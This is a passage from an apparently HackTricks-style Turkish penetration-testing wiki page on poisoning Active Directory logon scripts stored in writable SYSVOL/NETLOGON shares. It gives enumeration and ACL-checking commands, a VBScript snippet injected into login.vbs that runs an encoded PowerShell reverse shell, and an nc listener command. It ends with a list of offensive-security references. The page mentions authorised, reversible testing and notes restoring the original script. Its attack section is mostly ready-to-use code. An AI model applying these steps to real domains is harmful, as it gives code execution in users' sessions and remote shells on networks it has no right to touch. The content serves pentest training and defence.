Script path spoof edilebilir bir hostname'e işaret ediyorsa UNC host'u yönlendirin ve beklenen konumdan değiştirilmiş script içeriği sunun.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki yazılabilir path'ler, GPO aracılığıyla kullanıcı oturum açarken çalıştırılan logon script'lerin kurcalanmasına olanak tanır. Bu, oturum açan kullanıcıların güvenlik bağlamında code execution sağlar.

### Logon script'leri bulma
- Yapılandırılmış bir logon script olup olmadığını görmek için kullanıcı özniteliklerini inceleyin:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Kısayolları veya script referanslarını ortaya çıkarmak için domain paylaşımlarını tarayın:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- SYSVOL/NETLOGON içindeki hedefleri bulmak için `.lnk` dosyalarını ayrıştırın (faydalı bir DFIR numarası ve doğrudan GPO erişimi olmayan saldırganlar için):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound, mevcut olduğunda kullanıcı nesnesinin `scriptPath` logon-script özniteliğini gösterir. GPO ile yapılandırılan logon script’leri ayrı bir policy referansıdır; bu nedenle ilgili GPO’yu da inceleyin.

### Yazma erişimini doğrulayın (share listelerine güvenmeyin)
Otomatik araçlar, ilgili script’in NTFS ACL’si farklı olsa bile SYSVOL/NETLOGON’u salt okunur olarak gösterebilir. Önce bu dosyayı ve üst dizinini salt okunur şekilde inceleyin; eşleşen Allow ACE’ler olası adaylardır, çünkü etkin SMB ve NTFS erişimi, Deny ACE’ler ve mevcut token’ın tümü önemlidir:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Yetkili bir yazma testi hedefe özel ve geri alınabilir olmalı; orijinal script yedeklenip geri yüklenmelidir. Erişimi test etmek için çalışan bir logon script'in üzerine yazmayın; başarılı bir yazma işlemi, bir sonraki kullanıcının logon olmasıyla çalışabilir.

### RCE için bir VBScript logon script'ini zehirleme
İşlevselliği bozmamak için orijinal mantığı koruyarak, PowerShell reverse shell başlatan bir komut ekleyin (revshells.com üzerinden oluşturun):

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Ana makinenizde dinleyin ve bir sonraki etkileşimli oturum açmayı bekleyin:

```bash
rlwrap -cAr nc -lnvp 443
```

Notlar:
- Çalıştırma, SYSTEM yerine günlük kaydı tutan kullanıcının token'ı altında gerçekleşir. Kapsam, bu script'i uygulayan GPO bağlantısıdır (OU, site, domain).
- Kullanımdan sonra özgün içeriği/zaman damgalarını geri yükleyerek temizleyin.


## References

- [1] [Active Directory ACL/ACE'lerini kötüye kullanma](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Saldırı Yolu Güncellemesi](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory'de ACL'lerle ayrıcalık yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Ayrıcalıklarını ve Ayrıcalıklı Hesapları Tarama](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux'tan AD öznitelik/UAC işlemleri](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (grup üyeliği)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL kötüye kullanımı, KeePassXC Argon2 kırma ve DC admin'e ulaşmak için DPAPI şifre çözme](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kod çalıştırma ve NTLM Relay için GPO UNC yollarını ele geçirme](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relay ve diğer yöntemlerle Active Directory GPO'larını istismar etme](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU şaka mı yapıyor? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory'deki gizli Organizational Unit ACL saldırı vektörlerini istismar etme](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Ağda meşru Active Directory hizmetlerini taklit etme: GPO istismarı örneği](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
